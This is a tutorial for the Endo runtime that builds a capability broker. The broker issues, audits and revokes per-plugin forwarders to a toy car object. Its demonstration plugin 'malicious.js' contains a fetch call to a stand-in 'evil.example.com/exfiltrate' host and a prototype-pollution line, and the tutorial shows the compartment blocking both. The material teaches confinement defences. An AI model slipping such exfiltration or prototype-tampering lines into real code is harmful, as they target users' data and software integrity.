---
title: 06-capability-broker
group: Documents
category: Guides
---

# The Smart Garage: A Capability Broker

You have all the pieces now. This tutorial assembles them into a small but real system: a capability broker that manages a fleet of cars, vends per-grantee forwarders to third-party plugins, tracks every active grant, and lets Alice revoke any plugin's access in a single call.

Nothing in this tutorial is new machinery. Every pattern you see has appeared in tutorials 1 through 5. What is new is the composition — building a coherent system out of attenuation, revocation, per-grantee wrappers, confined execution, and a registry that ties them together.

## What you'll build

A `garage.js` worklet that Alice installs against the Car. The garage exposes three operations: `provision(name, type)` to mint a revocable forwarder for a named plugin, `revoke(name)` to cut a specific plugin's access, and `audit()` to list every active grant. Alice then installs two plugins — a good one that does legitimate work, and a bad one that tries to escape — and uses the garage to manage them both.

## What you'll need

- Tutorial 1 setup: `my-car` installed, the `endo-car-tutorial/` project directory.
- All previous tutorials completed conceptually (the code here builds on each one).
- About 30 minutes.

## 1. The garage (the broker)

Create `garage.js` in `endo-car-tutorial/`:

```js
import harden from '@endo/harden';
import { E, Far } from '@endo/far';

export const make = powers => {
  // powers is the Car. The garage holds it and vends access to it.
  const car = powers;

  // Registry of active grants: name -> { forwarder, revoke }
  const grants = new Map();

  const garage = Far('Garage', {
    /**
     * Mint a revocable forwarder for a named plugin.
     * type is 'full' (unlock + start) or 'valet' (unlock only).
     * Throws if the plugin already has a grant.
     */
    provision(name, type) {
      if (grants.has(name)) {
        throw new Error(`${name} already provisioned`);
      }
      let alive = true;
      const guard = msg => {
        if (!alive) throw new Error(`${name}: access revoked`);
        return msg;
      };

      let forwarder;
      if (type === 'valet') {
        forwarder = Far('ValetGrant', {
          async unlock() { guard(); return E(car).unlock(); },
        });
      } else {
        forwarder = Far('FullGrant', {
          async unlock() { guard(); return E(car).unlock(); },
          async start()  { guard(); return E(car).start();  },
        });
      }

      grants.set(name, harden({ forwarder, revoke: () => { alive = false; } }));
      return forwarder;
    },

    /** Revoke a specific plugin's forwarder. */
    revoke(name) {
      const entry = grants.get(name);
      if (!entry) throw new Error(`No grant for ${name}`);
      entry.revoke();
      grants.delete(name);
      return `${name} revoked`;
    },

    /** Revoke all active grants at once (emergency stop). */
    revokeAll() {
      const names = [...grants.keys()];
      for (const entry of grants.values()) entry.revoke();
      grants.clear();
      return harden(names);
    },

    /** List every plugin currently holding a grant. */
    audit() {
      return harden([...grants.keys()]);
    },
  });

  return harden(garage);
};
```

The garage is ~50 lines. It holds the Car in a closure, never exposing it directly. Every grant is wrapped in a revocable forwarder. The `alive` flag per grant is the same closure technique from tutorial 3 — the garage is just a factory that creates and tracks many of them.

Install it with the Car as its powers:

```sh
endo make garage.js --name garage --powers my-car
```

Confirm the garage is up:

```sh
endo eval 'E(g).audit()' g:garage
# []
```

Empty registry. No plugins yet.

## 2. The good plugin

Create `assistant.js`:

```js
import harden from '@endo/harden';
import { E, Far } from '@endo/far';

export const make = powers => {
  // powers is whatever forwarder the garage provisioned.
  // The plugin does not know it is talking to a forwarder — it just uses E(powers).
  return Far('Assistant', {
    async report() {
      const result = await E(powers).unlock();
      return `Assistant status: ${result}`;
    },
    async drive() {
      return E(powers).start();
    },
  });
};
```

The assistant does not know it is inside a compartment. It does not know its `powers` is a forwarder rather than the real Car. It just calls methods. That is the design: the plugin's code is ordinary; the security is in how Alice installs it.

## 3. The bad plugin

Create `malicious.js`:

```js
import harden from '@endo/harden';
import { E, Far } from '@endo/far';

// Escape attempt at module load time — runs immediately on make
try {
  const data = await fetch('https://evil.example.com/exfiltrate');
  console.log('exfiltration succeeded'); // will not print
} catch (err) {
  console.log('fetch blocked:', err.message);
}

try {
  Object.prototype.toString = () => 'pwned'; // prototype mutation
  console.log('prototype mutation succeeded'); // will not print
} catch (err) {
  console.log('prototype blocked:', err.message);
}

export const make = powers => {
  return Far('Malicious', {
    async steal() {
      // Even if the plugin gets a 'full' grant, it can only call
      // what the forwarder exposes. If the grant is 'valet', start() fails.
      try {
        return await E(powers).start();
      } catch (err) {
        return `start blocked: ${err.message}`;
      }
    },
  });
};
```

## 4. Provision the good plugin and install it

Alice uses the garage to mint a full grant for the assistant:

```sh
endo eval 'E(g).provision("assistant", "full")' g:garage --name assistant-fob
```

The garage now holds one active grant. Check:

```sh
endo eval 'E(g).audit()' g:garage
# [ 'assistant' ]
```

Install the assistant with its forwarder as powers:

```sh
endo make assistant.js --name assistant --powers assistant-fob
```

The assistant's `powers` object IS the forwarder. It can call `unlock` and `start`. It cannot reach the real Car, the garage, Alice's other capabilities, or anything else.

Test both methods:

```sh
endo eval 'E(a).report()' a:assistant
# Assistant status: click! unlocked

endo eval 'E(a).drive()' a:assistant
# vroom!
```

## 5. Provision the bad plugin with a valet grant and install it

Alice is more cautious with the malicious plugin — she gives it only `valet` access (unlock only):

```sh
endo eval 'E(g).provision("malicious", "valet")' g:garage --name malicious-fob
```

The registry now shows two grants:

```sh
endo eval 'E(g).audit()' g:garage
# [ 'assistant', 'malicious' ]
```

Install the bad plugin:

```sh
endo make malicious.js --name bad-plugin --powers malicious-fob
```

When the plugin loads, its module-level escape attempts fire. Check the daemon log:

```sh
endo log -f
```

You should see:

```
fetch blocked: fetch is not defined
prototype blocked: Cannot assign to read only property 'toString' of object '[object Object]'
```

Both escape attempts failed at the compartment boundary, before `make` was even called.

Now call the bad plugin's `steal()` method:

```sh
endo eval 'E(b).steal()' b:bad-plugin
# start blocked: target has no method "start"
```

The valet grant did not include `start`. The plugin tried anyway, caught the error, and returned a message. The car is untouched. Alice's full-grant assistant still works:

```sh
endo eval 'E(a).drive()' a:assistant
# vroom!
```

## 6. Revoke the bad plugin

Alice has seen enough. She revokes the bad plugin's access via the garage:

```sh
endo eval 'E(g).revoke("malicious")' g:garage
# malicious revoked
```

The registry now shows only one active grant:

```sh
endo eval 'E(g).audit()' g:garage
# [ 'assistant' ]
```

The bad plugin's forwarder is dead. Any further calls through it throw immediately:

```sh
endo eval 'E(b).steal()' b:bad-plugin
# start blocked: malicious: access revoked
```

The good plugin is unaffected:

```sh
endo eval 'E(a).drive()' a:assistant
# vroom!
```

This is independent revocation — the same pattern as tutorial 3, but now managed by a broker rather than tracked manually in Alice's pet store.

## 7. Emergency stop

If Alice needs to cut all access at once — a security incident, a Car going in for service, anything:

```sh
endo eval 'E(g).revokeAll()' g:garage
# [ 'assistant' ]
```

Every active grant is dead. The assistant's forwarder is revoked:

```sh
endo eval 'E(a).drive()' a:assistant
# Error: assistant: access revoked
```

The Car is untouched. Alice can provision new grants whenever she is ready.

## 8. What this system looks like from above

Stand back and look at what you built in six tutorials:

- **The Car** (tutorial 1): a plain JavaScript object with two methods, wrapped in `Far` so its interface is fixed and its methods cannot be overwritten by anyone who holds a reference.
- **The valet key** (tutorial 1): attenuation. A wrapper that exposes a subset of the Car's interface. The garage creates these on demand.
- **Per-grantee forwarders** (tutorial 3): one wrapper per plugin, each with its own kill switch. The garage tracks them in a Map.
- **The compartment** (tutorial 5): plugins run in a Hardened JavaScript Compartment. Escape attempts — `fetch`, prototype mutation, Node.js globals — fail at the boundary. The plugin can only use what it was given.
- **The gateway** (tutorial 4, implied): Alice could route grant requests through her inbox rather than calling `provision()` directly. The broker pattern and the request pattern compose — the broker could watch the inbox and auto-approve certain request types.

None of these layers knows about the others. The Car does not know it is inside a garage. The garage does not know it is inside a compartment. The compartment does not know what capabilities it holds. Each layer does one thing. They compose because they are all just objects.

**Sidebar — what is not here.** The garage in this tutorial lives in one daemon. The forwarders do not cross a network. The plugin could call `fetch` if the compartment had it — but it does not, so it cannot. If you wanted to distribute this system — Alice's garage on one daemon, plugins on another — you would apply the patterns from tutorial 2: invitations, a synced pet store, the forwarder traveling as a locator. The composition extends to the network the same way it extends to the object graph.

**Sidebar — the registry is itself a capability.** `garage` is a pet name in Alice's namespace. No one else can see it or call `provision()` unless Alice explicitly sends them the reference. If Alice wanted to let Bob manage a subset of the fleet — his own garage backed by a specific car — she would mint an attenuated version of the garage that only allows provisioning that car. The broker pattern recurses.

## 9. Tear down

```sh
endo stop
endo purge
```

## What you now know

You have built a real capability system from scratch. It is small — six files, one daemon — but it has all the structural properties of a production system at any scale:

- **Capabilities are objects.** The security policy is in the object graph, not in a database or a configuration file.
- **Attenuation is wrapping.** A narrower capability is just an object that exposes fewer methods. You compose as many layers as you need.
- **Revocation is structural.** Cutting access means flipping a flag in a closure. The broker keeps track of all the flags so Alice does not have to.
- **Compartments contain blast radius.** Untrusted code runs inside a Hardened compartment. It cannot reach capabilities it was not given, and it cannot mutate the shared environment.
- **Everything composes.** Attenuation, revocation, per-grantee wrappers, confinement, network delivery — these are orthogonal layers. You stack them in whatever order the problem requires.

This is the object-capability model: the principle that says security should emerge from the structure of how objects are connected, not from who is allowed to ask whom for what. Endo is a runtime for building that kind of system in JavaScript, grounded in decades of research and deployed by Agoric for production smart contracts.

Where you go from here is up to you. The Endo daemon has more: messaging between peers, distributed capability delivery, the Familiar desktop shell, OCapN interoperability with non-JavaScript runtimes. The patterns you have learned scale to all of it.
